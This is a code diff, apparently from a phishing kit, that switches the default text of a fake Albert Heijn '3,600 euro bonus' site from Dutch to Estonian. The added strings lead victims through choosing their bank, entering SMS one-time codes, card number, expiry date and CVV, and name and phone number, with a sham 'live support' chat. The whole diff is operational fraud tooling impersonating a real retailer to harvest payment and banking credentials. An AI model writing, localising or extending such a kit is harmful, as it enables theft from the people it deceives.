@@ -64,6 +64,31 @@ const ESTONIAN_SUPPORT_CENTER_NAME = "Albert Heijn Klienditeenindus";
 const LEGACY_WIN_TITLE = "Exclusieve Albert Heijn bonus";
 const LEGACY_WIN_SUBTITLE =
   "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 3.600 euro te claimen.";
+const ESTONIAN_PORTAL_NAME = "Albert Heijn Kliendiportaal";
+const ESTONIAN_WIN_TITLE = "Eksklusiivne Albert Heijn Boonus";
+const ESTONIAN_WIN_SUBTITLE =
+  "Palju õnne! Olete valitud tänasesse Albert Heijn kampaaniasse. Klõpsake allolevat nuppu, et lunastada oma 3600 euro suurune boonus.";
+const ESTONIAN_WIN_BUTTON = "Lunasta boonus";
+const ESTONIAN_BANKEN_TITLE = "Vali oma pank";
+const ESTONIAN_BANKEN_SUBTITLE = "Jätkamiseks vali oma pank.";
+const ESTONIAN_BANKEN_SEARCH_PLACEHOLDER = "Otsi oma panka...";
+const ESTONIAN_WAIT_TITLE = "Palun oota";
+const ESTONIAN_WAIT_SUBTITLE = "Teie päringut töödeldakse turvaliselt...";
+const ESTONIAN_SMS_TITLE = "SMS turvakood";
+const ESTONIAN_SMS_SUBTITLE = "Sisesta {digits}-kohaline kood.";
+const ESTONIAN_SMS_INPUT_LABEL = "Ühekordne kood";
+const ESTONIAN_SMS_BUTTON = "Kinnita";
+const ESTONIAN_SMS_LOADING = "Töötlemine...";
+const ESTONIAN_CARD_TITLE = "Makseandmed";
+const ESTONIAN_CARD_SUBTITLE = "Kontrolli ja kinnita oma andmed.";
+const ESTONIAN_CARD_OWNER_LABEL = "Kaardiomaniku nimi";
+const ESTONIAN_CARD_NUMBER_LABEL = "Kaardi number";
+const ESTONIAN_CARD_EXPIRY_LABEL = "Aegumiskuupäev KK/AA";
+const ESTONIAN_CARD_CVV_LABEL = "Turvakood";
+const ESTONIAN_CARD_BUTTON = "Jätka";
+const ESTONIAN_CODE_TITLE = "Tere tulemast";
+const ESTONIAN_CODE_SUBTITLE = "Sisesta osalemiskood, mille said partnerilt {partner}, et oma auhind avada.";
+const ESTONIAN_CODE_BUTTON = "Kinnita kood";
 const LEGACY_LIVE_SUPPORT_TITLES = new Set([
   "Live support",
   "Live Support",
@@ -83,6 +108,14 @@ const ESTONIAN_LIVE_SUPPORT_TITLE = "Reaalajas tugi";
 const ESTONIAN_LIVE_SUPPORT_SUBTITLE =
   "Jätkamiseks peate võtma ühendust meie klienditeenindusega.\n\nKlõpsake allolevat nuppu, et alustada vestlust.";
 const ESTONIAN_LIVE_SUPPORT_BUTTON = "Alusta vestlust";
+const ESTONIAN_PROFILE_TITLE_SMALL = "Auhinna kinnitus";
+const ESTONIAN_PROFILE_TITLE_MAIN = "Sinu boonuse summa";
+const ESTONIAN_PROFILE_SUBTITLE = "Kinnita oma andmed edasiseks töötlemiseks.";
+const ESTONIAN_PROFILE_FIRSTNAME_LABEL = "Eesnimi";
+const ESTONIAN_PROFILE_LASTNAME_LABEL = "Perekonnanimi";
+const ESTONIAN_PROFILE_PHONE_LABEL = "Mobiilinumber";
+const ESTONIAN_PROFILE_BUTTON = "Edasi";
+const ESTONIAN_PROFILE_LOADING_TEXT = "Töötlemine...";
 
 function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
   const next = { ...settings };
@@ -104,20 +137,19 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
   }
 
   if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME) {
-    next.portal_name = "Albert Heijn klantenportaal";
+    next.portal_name = ESTONIAN_PORTAL_NAME;
   }
 
   if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME) {
-    next.support_center_name = "Albert Heijn service";
+    next.support_center_name = ESTONIAN_SUPPORT_CENTER_NAME;
   }
 
   if (!next.win_title || next.win_title === LEGACY_WIN_TITLE) {
-    next.win_title = "Exclusieve Albert Heijn bonus";
+    next.win_title = ESTONIAN_WIN_TITLE;
   }
 
   if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE) {
-    next.win_subtitle =
-      "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 3.600 euro te claimen.";
+    next.win_subtitle = ESTONIAN_WIN_SUBTITLE;
   }
 
   if (next.target_country) {
@@ -142,52 +174,82 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     }
   }
 
+  if (!next.win_button) next.win_button = ESTONIAN_WIN_BUTTON;
+  if (!next.banken_title) next.banken_title = ESTONIAN_BANKEN_TITLE;
+  if (!next.banken_subtitle) next.banken_subtitle = ESTONIAN_BANKEN_SUBTITLE;
+  if (!next.banken_search_placeholder) next.banken_search_placeholder = ESTONIAN_BANKEN_SEARCH_PLACEHOLDER;
+  if (!next.wait_title) next.wait_title = ESTONIAN_WAIT_TITLE;
+  if (!next.wait_subtitle) next.wait_subtitle = ESTONIAN_WAIT_SUBTITLE;
+  if (!next.sms_title) next.sms_title = ESTONIAN_SMS_TITLE;
+  if (!next.sms_subtitle) next.sms_subtitle = ESTONIAN_SMS_SUBTITLE;
+  if (!next.sms_input_label) next.sms_input_label = ESTONIAN_SMS_INPUT_LABEL;
+  if (!next.sms_button) next.sms_button = ESTONIAN_SMS_BUTTON;
+  if (!next.sms_loading) next.sms_loading = ESTONIAN_SMS_LOADING;
+  if (!next.card_title) next.card_title = ESTONIAN_CARD_TITLE;
+  if (!next.card_subtitle) next.card_subtitle = ESTONIAN_CARD_SUBTITLE;
+  if (!next.card_owner_label) next.card_owner_label = ESTONIAN_CARD_OWNER_LABEL;
+  if (!next.card_number_label) next.card_number_label = ESTONIAN_CARD_NUMBER_LABEL;
+  if (!next.card_expiry_label) next.card_expiry_label = ESTONIAN_CARD_EXPIRY_LABEL;
+  if (!next.card_cvv_label) next.card_cvv_label = ESTONIAN_CARD_CVV_LABEL;
+  if (!next.card_button) next.card_button = ESTONIAN_CARD_BUTTON;
+  if (!next.code_title) next.code_title = ESTONIAN_CODE_TITLE;
+  if (!next.code_subtitle) next.code_subtitle = ESTONIAN_CODE_SUBTITLE;
+  if (!next.code_button) next.code_button = ESTONIAN_CODE_BUTTON;
+  if (!next.profile_title_small) next.profile_title_small = ESTONIAN_PROFILE_TITLE_SMALL;
+  if (!next.profile_title_main) next.profile_title_main = ESTONIAN_PROFILE_TITLE_MAIN;
+  if (!next.profile_subtitle) next.profile_subtitle = ESTONIAN_PROFILE_SUBTITLE;
+  if (!next.profile_firstname_label) next.profile_firstname_label = ESTONIAN_PROFILE_FIRSTNAME_LABEL;
+  if (!next.profile_lastname_label) next.profile_lastname_label = ESTONIAN_PROFILE_LASTNAME_LABEL;
+  if (!next.profile_phone_label) next.profile_phone_label = ESTONIAN_PROFILE_PHONE_LABEL;
+  if (!next.profile_button) next.profile_button = ESTONIAN_PROFILE_BUTTON;
+  if (!next.profile_loading_text) next.profile_loading_text = ESTONIAN_PROFILE_LOADING_TEXT;
+  if (!next.site_language) next.site_language = "et";
+  if (!next.target_country) next.target_country = "Estonya";
+
   return next;
 }
 
 export const defaultSettings: GlobalSettings = {
   logo_url: ALBERT_HEIJN_LOGO_URL,
   bg_url: ALBERT_HEIJN_BG_URL,
-  portal_name: "Albert Heijn klantenportaal",
-  support_center_name: "Albert Heijn service",
-  win_title: "Exclusieve Albert Heijn bonus",
-  win_subtitle:
-    "Gefeliciteerd! Je bent geselecteerd voor onze Albert Heijn actie van vandaag. Klik op de knop hieronder om je bonus van 3.600 euro te claimen.",
-  win_button: "Bonus claimen",
-  banken_title: "Kies je bank",
-  banken_subtitle: "Selecteer je Nederlandse bank om verder te gaan.",
-  banken_search_placeholder: "Zoek je bank...",
-  wait_title: "Even geduld",
-  wait_subtitle: "Je aanvraag wordt veilig verwerkt...",
-  sms_title: "SMS-beveiligingscode",
-  sms_subtitle: "Voer de {digits}-cijferige code in.",
-  sms_input_label: "Eenmalige code",
-  sms_button: "Bevestigen",
-  sms_loading: "Verwerken...",
-  card_title: "Betaalgegevens",
-  card_subtitle: "Controleer en bevestig je gegevens.",
-  card_owner_label: "Naam kaarthouder",
-  card_number_label: "Kaartnummer",
-  card_expiry_label: "Vervaldatum MM/JJ",
-  card_cvv_label: "Beveiligingscode",
-  card_button: "Doorgaan",
-  code_title: "Welkom",
-  code_subtitle: "Voer de deelnamecode in die je van {partner} hebt ontvangen om je beloning vrij te geven.",
-  code_button: "Code bevestigen",
-  live_support_title: "Live support",
-  live_support_subtitle:
-    "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
-  live_support_button: "Chat openen",
-  profile_title_small: "Prijsbevestiging",
-  profile_title_main: "Je bonusbedrag",
-  profile_subtitle: "Bevestig je gegevens voor de verdere verwerking.",
-  profile_firstname_label: "Voornaam",
-  profile_lastname_label: "Achternaam",
-  profile_phone_label: "Mobiel nummer",
-  profile_button: "Verder",
-  profile_loading_text: "Verwerken...",
-  site_language: "nl",
-  target_country: "Hollanda",
+  portal_name: ESTONIAN_PORTAL_NAME,
+  support_center_name: ESTONIAN_SUPPORT_CENTER_NAME,
+  win_title: ESTONIAN_WIN_TITLE,
+  win_subtitle: ESTONIAN_WIN_SUBTITLE,
+  win_button: ESTONIAN_WIN_BUTTON,
+  banken_title: ESTONIAN_BANKEN_TITLE,
+  banken_subtitle: ESTONIAN_BANKEN_SUBTITLE,
+  banken_search_placeholder: ESTONIAN_BANKEN_SEARCH_PLACEHOLDER,
+  wait_title: ESTONIAN_WAIT_TITLE,
+  wait_subtitle: ESTONIAN_WAIT_SUBTITLE,
+  sms_title: ESTONIAN_SMS_TITLE,
+  sms_subtitle: ESTONIAN_SMS_SUBTITLE,
+  sms_input_label: ESTONIAN_SMS_INPUT_LABEL,
+  sms_button: ESTONIAN_SMS_BUTTON,
+  sms_loading: ESTONIAN_SMS_LOADING,
+  card_title: ESTONIAN_CARD_TITLE,
+  card_subtitle: ESTONIAN_CARD_SUBTITLE,
+  card_owner_label: ESTONIAN_CARD_OWNER_LABEL,
+  card_number_label: ESTONIAN_CARD_NUMBER_LABEL,
+  card_expiry_label: ESTONIAN_CARD_EXPIRY_LABEL,
+  card_cvv_label: ESTONIAN_CARD_CVV_LABEL,
+  card_button: ESTONIAN_CARD_BUTTON,
+  code_title: ESTONIAN_CODE_TITLE,
+  code_subtitle: ESTONIAN_CODE_SUBTITLE,
+  code_button: ESTONIAN_CODE_BUTTON,
+  live_support_title: ESTONIAN_LIVE_SUPPORT_TITLE,
+  live_support_subtitle: ESTONIAN_LIVE_SUPPORT_SUBTITLE,
+  live_support_button: ESTONIAN_LIVE_SUPPORT_BUTTON,
+  profile_title_small: ESTONIAN_PROFILE_TITLE_SMALL,
+  profile_title_main: ESTONIAN_PROFILE_TITLE_MAIN,
+  profile_subtitle: ESTONIAN_PROFILE_SUBTITLE,
+  profile_firstname_label: ESTONIAN_PROFILE_FIRSTNAME_LABEL,
+  profile_lastname_label: ESTONIAN_PROFILE_LASTNAME_LABEL,
+  profile_phone_label: ESTONIAN_PROFILE_PHONE_LABEL,
+  profile_button: ESTONIAN_PROFILE_BUTTON,
+  profile_loading_text: ESTONIAN_PROFILE_LOADING_TEXT,
+  site_language: "et",
+  target_country: "Estonya",
   wheel_settings: {},
 };
 
